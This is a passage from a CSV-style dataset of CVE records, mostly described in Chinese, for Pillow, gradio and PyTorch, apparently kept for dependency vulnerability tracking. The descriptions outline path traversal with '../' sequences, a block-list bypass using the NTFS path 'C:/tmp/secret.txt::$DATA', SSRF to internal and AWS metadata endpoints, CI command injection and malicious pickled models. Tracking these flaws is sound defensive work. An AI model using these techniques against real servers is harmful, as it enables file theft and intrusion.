Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,gradio,,True,CVE-2024-4941,CWE-22,,Gradio 是一个开源 Python 库，用于通过友好的 Web 界面演示机器学习模型。Gradio 4.25 版本中存在输入验证错误漏洞，该漏洞源于 `gradio/components/json_component.py` 的 `postprocess` 函数，由于路径验证不当，攻击者可以发送恶意的 JSON 对象，其中包含 `path` 键，进而读取远程系统上的文件，导致信息泄露。,2,1
gradio-app_gradio,gradio,,True,CVE-2023-41626,CWE-434,2023-09-15,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio v3.27.0 版本存在安全漏洞，该漏洞源于/upload接口存在任意文件上传漏洞。",3,0
gradio-app_gradio,gradio,,True,CVE-2023-34239,CWE-20,2023-06-07,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 3.33.1及之前版本存在输入验证错误漏洞，该漏洞源于缺少路径过滤，导致Gradio没有正确限制用户的文件访问。",3,2
gradio-app_gradio,gradio,,True,,CWE-22,2022-01-04,"## Overview
[gradio](https://pypi.org/project/gradio) is a Python library for easily interacting with trained machine learning models

Affected versions of this package are vulnerable to Arbitrary File Read due to missing file path validation in `gradio/networking.py`.
## Remediation
Upgrade `gradio` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/gradio-app/gradio/pull/406/commits/8bdc59735f99635c76ea07f5ee4c6b622ab0d238)
- [GitHub PR](https://github.com/gradio-app/gradio/pull/406)
",3,0
gradio-app_gradio,gradio,,True,CVE-2023-6572,CWE-77,,"Gradio是一个开源的 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此漏洞源于应用会将敏感信息暴露给未经授权的参与者。当用户能够控制`github.event.workflow_run.head_branch`的值时，可以在""生成变更集""工作流中注入shell命令。该漏洞的影响范围广泛，攻击者可以利用这一点操控系统执行任意命令。",1,1
gradio-app_gradio,gradio,,True,CVE-2024-0964,CWE-22,,"Gradio是一个开源Python库，旨在通过友好的Web界面演示机器学习模型。该漏洞源于API请求中用户提供的JSON值的缺乏正确验证，攻击者可以通过构造特定的JSON负载利用这个漏洞，读取服务器上的任意文件。当攻击者使用路径遍历序列（例如""../""）或绝对文件路径时，可能会访问存储在文件系统中的任意文件及目录，包括应用程序源代码、配置文件及其他关键系统文件。",2,1
gradio-app_gradio,gradio,,True,CVE-2023-51449,CWE-22,2023-12-22,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。在 Gradio 4.11.0 之前的版本中，存在路径遍历漏洞。该漏洞的根本原因在于 /file 端点对输入路径的处理不当，攻击者可以通过构造恶意路径来访问服务器上的任意文件。,3,1
gradio-app_gradio,gradio,,True,CVE-2021-43831,CWE-22,2021-12-15,Gradio 是一个开源 Python 库，用于通过用户友好的 Web 界面演示和交互机器学习模型。Gradio 2.5.0 之前的版本存在一个安全漏洞，该漏洞源于对文件访问权限控制不当。攻击者可以利用此漏洞访问主机上的任何文件，从而读取本不应访问的数据和信息。,1,1
gradio-app_gradio,gradio,,True,,CWE-918,2024-01-01,"## Overview
[gradio](https://pypi.org/project/gradio) is a Python library for easily interacting with trained machine learning models

Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) using the `/file` route since it used to perform a `GET/HEAD` request to determine if a `filepath` was a possible URL.
## Remediation
Upgrade `gradio` to version 4.10.0 or higher.
## References
- [GitHub PR](https://github.com/gradio-app/gradio/pull/6794)
",3,0
gradio-app_gradio,gradio,,True,CVE-2024-1729,CWE-367,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。该漏洞源于字符串比较方式处理不当，在遇到字符串不匹配时可提前终止，攻击者可以利用这一行为进行暴力破解，猜测密码受保护的应用程序。攻击者可以发起大量请求而不受请求限制，从而容易猜测出正确的用户凭证。,3,1
gradio-app_gradio,gradio,,True,CVE-2022-24770,CWE-1236,2022-03-17,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 2.8.11之前版本 存在安全漏洞，该漏洞源于gradio中 CSV 文件的公式元素中和不当。该漏洞允许攻击者将任意文本保存到 CSV 文件中。如果像 MS Excel 程序打开这样的文件，它会自动运行这些命令，这会导致在用户的计算机上运行任意命令。",2,0
gradio-app_gradio,gradio,,True,CVE-2023-25823,CWE-798,2023-02-23,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 3.13.1之前版本存在安全漏洞，该漏洞源于包含硬编码凭证的使用。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-1727,CWE-352,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。该漏洞源于 CORS 规则的实现不当，导致攻击者可以通过构造特定请求，绕过要求 `host` 头部为 localhost（或其别名）、`origin` 头部的限制，从而实施跨站请求伪造攻击。攻击者可以利用此漏洞，向运行 Gradio 的本地服务器发送请求，上传多个大型文件，导致目标系统的可用磁盘空间耗尽，进而可能影响服务的可用性。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-2206,CWE-918,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。此漏洞存在于 Gradio 的 /proxy 路由中，攻击者可以通过操纵请求中的 X-Direct-Url 头，允许代理任意 URL，包括潜在的内部端点。由于应用程序在处理自定义网址时缺乏适当的验证，这使得攻击者能够将 URL 添加到代理请求中，从而损害系统的安全性。通过此方法，攻击者可以获取内部网络信息。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1540,CWE-77,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。存在命令注入漏洞，该漏洞源于不当处理 CI 过程中的命令行参数。攻击者可以通过特定的输入在执行 shell 脚本时注入恶意命令，造成信息泄露和未授权的基库修改。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1728,CWE-22,,Gradio是一个开源的Python库，通过友好的Web界面演示机器学习模型。该漏洞源于对用户输入的验证不当，攻击者可以通过操控上传至'/queue/join'端点的文件路径来读取文件系统中的任意文件，如私钥等。该漏洞可能导致远程代码执行，使得攻击者能够将文件上传重定向到服务器上未预期的位置。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1561,CWE-29,,Gradio 是一个开源的 Python 库，用于以友好的 Web 界面展示机器学习模型。该库存在一个不当访问控制的漏洞，具体表现为 `/component_server` 端点错误地允许以攻击者控制的参数调用 `Component` 类上的任何方法。攻击者可以利用 `Block` 类的 `move_resource_to_block_cache()` 方法，通过该漏洞实现对本地文件的未授权读取，从而可能导致敏感信息泄露。尤其是在通过 `launch(share=True)` 暴露应用程序到互联网后，任何人都可以读取用户计算机上的文件。此外，所有托管在 huggingface.co 上的 Gradio 应用程序也受到此漏洞的影响。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1183,CWE-601,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面与训练好的机器学习模型进行交互。存在服务器端请求伪造 (SSRF) 漏洞，源于对 'file' 参数的处理不当。攻击者可以通过构造特定的 GET 请求，利用此漏洞扫描和识别内部网络中的开放端口，通过 'Location' 头或 'File not allowed' 错误的响应来判断内部端口的状态。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-34511,CWE-284,2024-05-05,Gradio 是一个开源的 Python 库，用于创建用户友好的接口，广泛应用于机器学习和数据科学应用。此漏洞存在于 Gradio 组件处理 `_is_server_fn` 属性验证的过程中。由于对函数 `_is_server_fn` 属性的验证不当，攻击者可能会利用该漏洞执行原本受限的函数，进而实现未授权的操作或访问敏感数据。,3,0
gradio-app_gradio,gradio,,True,CVE-2024-34510,CWE-116,2024-05-05,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 4.20之前版本存在安全漏洞，该漏洞源于允许 Windows 上的凭据泄露。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-4940,CWE-601,,Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此库存在输入验证错误漏洞，该漏洞源于开放重定向的安全问题。攻击者可以通过构造恶意的 URL，将用户重定向到任意网站，从而进行网络钓鱼攻击、跨站脚本攻击 (XSS) 等。利用此漏洞，攻击者能够根据响应中的 'Location' 头或 '文件不允许' 错误判断内部网络中开放端口的状态，从而逐步扫描内部网络。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-4325,CWE-918,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面简化机器学习模型的演示。该漏洞存在于 Gradio 4.21.0 版本的 `/queue/join` 端点和 `save_url_to_cache` 函数中。由于对用户输入的 `path` 参数未进行充分的验证，攻方可以通过发送特制请求实现对内部网络或 AWS 元数据端点的未授权访问。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-47867,CWE-345,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在数据伪造问题漏洞，该漏洞源于如果攻击者获得下载 FRP 客户端的远程 URL 的访问权限，他们可以在不被发现的情况下修改二进制文件，因为 Gradio 服务器不会验证文件的校验和或签名。",4,2
gradio-app_gradio,gradio,,True,CVE-2024-47167,CWE-918,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于Gradio 的 `async_save_url_to_cache` 函数允许攻击者强制 Gradio 服务器向用户控制的 URL 发送 HTTP 请求。",3,1
gradio-app_gradio,gradio,,True,CVE-2024-47870,CWE-362,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在竞争条件问题漏洞，该漏洞源于攻击者利用该漏洞可以将用户流量重定向到恶意服务器。",2,0
gradio-app_gradio,gradio,,True,CVE-2024-47084,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于攻击者利用该漏洞可以向本地 Gradio 服务器发出未经授权的请求。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47872,CWE-79,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在跨站脚本漏洞，该漏洞源于经过身份验证的用户可以上传包含恶意脚本的文件，例如 HTML、JavaScript 或 SVG 文件。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47869,CWE-203,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于比较不是在恒定时间内完成的，攻击者可以通过测量不同请求的响应时间来逐字节推断正确的哈希值，从而利用这一点。",4,0
gradio-app_gradio,gradio,,True,CVE-2024-47168,CWE-670,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于即使在监控被禁用的情况下，攻击者或未经授权的用户仍然可以通过直接请求 /monitoring 端点来访问监控仪表板。",4,0
gradio-app_gradio,gradio,,True,CVE-2024-47164,CWE-22,2024-10-10,<p>Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。 Gradio存在路径遍历漏洞，该漏洞源于is_in_or_equal函数旨在检查文件是否位于给定目录中，可以使用某些使用`..`序列操纵文件路径来绕过该函数。</p>,4,2
gradio-app_gradio,gradio,,True,CVE-2024-47868,CWE-200 CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在信息泄露漏洞，该漏洞源于攻击者利用该漏洞可以通过制作绕过预期输入限制的请求来利用这些组件。",3,2
gradio-app_gradio,gradio,,True,CVE-2024-47871,CWE-311,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于HTTPS 未在连接上强制执行。攻击者利用该漏洞可以拦截和读取上传到 Gradio 服务器的文件，以及修改客户端和服务器之间发送的响应或数据。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-47165,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于当 Gradio 服务器在本地部署时，`localhost_aliases` 变量包含“null”作为有效来源。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47166,CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在路径遍历漏洞，该漏洞源于攻击者利用该漏洞可以通过操纵请求中的文件路径来访问和泄露自定义 Gradio 组件的源代码。",4,2
gradio-app_gradio,gradio,,True,CVE-2024-48052,CWE-918,2024-11-04,Gradio 是一个用于通过友好的Web界面展示和分享机器学习模型的开源Python库，能够简化数据科学家和开发者演示他们模型的过程。在版本4.42.0的Gradio中，其gr.DownloadButton函数中存在服务器端请求伪造（SSRF）漏洞。攻击者可能利用该漏洞通过该功能发送精心构造的请求，从而导致服务器执行未授权的外部请求。,2,0
gradio-app_gradio,gradio,,True,CVE-2025-23042,CWE-285,2025-01-14,"Gradio是Gradio开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 5.6.0之前版本存在授权问题漏洞，该漏洞源于对文件的路径验证逻辑缺乏规范化。攻击者利用该漏洞可以通过更改被阻止的文件或目录路径的字母大小写，绕过Gradio的文件路径访问控制列表（ACL）。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-8966,CWE-770,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面展示训练好的机器学习模型。在其文件上传过程中，存在一个拒绝服务（DoS）漏洞。攻击者可以在 multipart 边界的结尾添加大量字符，导致系统不断处理每个字符并发出警告。这可能导致 Gradio 在长时间内无法访问，从而中断服务，造成显著的停机时间。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-8021,CWE-601,,Gradio是一个开源的Python库，旨在通过友好的Web界面来演示机器学习模型。该库的最新版本存在开放重定向漏洞，允许攻击者通过URL编码的方式将用户重定向到恶意网站。此漏洞的根本原因在于Gradio在处理重定向请求时未能对外部URL进行足够的验证。攻击者可以通过发送特制请求，导致服务器返回302重定向到攻击者控制的网站。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-12217,CWE-22,,Gradio 是一个开源的 Python 库，旨在以友好的 Web 界面演示机器学习模型。该库在版本 git 67e4044 中存在一个路径遍历漏洞，其根本原因在于 blocked_path 功能的实现缺陷。具体来说，尽管该应用程序能正确阻止对类似 'C:/tmp/secret.txt' 的路径访问，但在使用 NTFS 备用数据流（ADS）语法时，例如 'C:/tmp/secret.txt::$DATA'，却未能阻止访问。这一缺陷可能导致未授权用户读取被阻止的文件路径。,3,1
gradio-app_gradio,gradio,,True,CVE-2025-48889,CWE-434,2025-05-30,Gradio的标记功能存在任意文件复制漏洞，攻击者可以绕过身份验证，复制服务器文件系统中的任何可读文件。攻击者不能读取复制的文件，但可以通过复制大型文件（如/dev/urandom）填满磁盘空间，导致服务拒绝。,3,2
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
